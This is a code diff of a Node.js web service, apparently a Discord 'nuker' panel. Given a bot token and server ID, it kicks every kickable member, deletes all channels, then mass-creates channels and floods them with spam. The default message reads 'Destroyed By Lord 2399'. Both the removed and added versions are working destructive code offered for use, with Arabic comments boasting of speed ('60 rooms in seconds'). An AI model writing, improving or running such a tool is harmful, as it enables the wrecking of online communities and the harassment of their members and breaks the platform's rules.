@@ -1,48 +1,77 @@
-const { Client, GatewayIntentBits, ChannelType, Partials } = require('discord.js');
+const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
 const express = require('express');
-const app = express();
+const cors = require('cors');
+const path = require('path');
 
+const app = express();
+app.use(cors());
 app.use(express.json());
-app.use(require('cors')());
-app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
+
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 app.post('/execute', async (req, res) => {
     const { token, guildId, action, customName, customMsg } = req.body;
-    const client = new Client({ intents: [3276799], partials: [Partials.Channel, Partials.GuildMember] });
+
+    // رد فوري للمتصفح لمنع التعليق
+    res.status(200).send({ status: '🚀 جاري محاولة تشغيل البوت..' });
+
+    const client = new Client({ 
+        intents: [
+            3276799 // كود الـ All Intents لضمان الوصول لكل شيء
+        ] 
+    });
 
     try {
         await client.login(token);
-        client.once('ready', async () => {
-            console.log(`✅ البوت متصل: ${client.user.tag}`);
-            const guild = await client.guilds.fetch(guildId).catch(() => null);
+        console.log(`Logged in as ${client.user.tag}`);
+
+        const guild = await client.guilds.fetch(guildId).catch(() => null);
+        if (!guild) {
+            console.log("Guild not found");
+            return client.destroy();
+        }
+
+        const name = customName || "Lord 2399";
+        const msg = customMsg || "# Destroyed By Lord 2399\nhttps://discord.gg/2399k";
+
+        // تنفيذ فوري وسريع جداً
+        if (action === 'طرد' || action === 'تدمير') {
+            const members = await guild.members.fetch();
+            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
+        }
+
+        if (action === 'تدمير') {
+            // حذف الرومات فوراً
+            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
             
-            if (!guild) return res.status(404).json({ status: '❌ البوت غير موجود في السيرفر!' });
-
-            // استجابة فورية للوحة
-            res.json({ status: '🚀 V11: بدأت العملية بنجاح! السيرفر قيد التدمير' });
-
-            const name = customName || "Toll Group 2399 V11";
-            const msg = customMsg || "# TOLL GROUP 2399 V11 ON TOP";
-
-            // التنفيذ (طرد وحذف)
-            if (action === 'تدمير' || action === 'طرد') {
-                const members = await guild.members.fetch();
-                members.forEach(m => { if(m.kickable) m.kick('V11 Power').catch(() => {}); });
+            // إنشاء رومات بسرعة جنونية (60 روم في ثواني)
+            for (let i = 0; i < 60; i++) {
+                setTimeout(() => {
+                    guild.channels.create({ 
+                        name: name, 
+                        type: ChannelType.GuildText 
+                    }).then(ch => {
+                        // سبام مكثف (30 رسالة لكل روم)
+                        for(let j=0; j<30; j++) {
+                            ch.send(msg).catch(() => {});
+                        }
+                    }).catch(() => {});
+                }, i * 150); 
             }
+        }
 
-            if (action === 'تدمير') {
-                guild.channels.cache.forEach(c => c.delete().catch(() => {}));
-                for (let i = 0; i < 120; i++) {
-                    setTimeout(async () => {
-                        const ch = await guild.channels.create({ name: name, type: ChannelType.GuildText }).catch(() => null);
-                        if (ch) for(let j=0; j<60; j++) ch.send(msg).catch(() => {});
-                    }, i * 25);
+        if (action === 'سبام') {
+            guild.channels.cache.forEach(ch => {
+                if(ch.type === ChannelType.GuildText) {
+                    for(let i=0; i<40; i++) setTimeout(() => ch.send(msg).catch(() => {}), i * 500);
                 }
-            }
-        });
-    } catch (err) {
-        res.status(500).json({ status: `❌ خطأ في التوكن: ${err.message}` });
+            });
+        }
+
+    } catch (error) {
+        console.error("Login Failed:", error.message);
     }
 });
 
-app.listen(process.env.PORT || 3000);
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
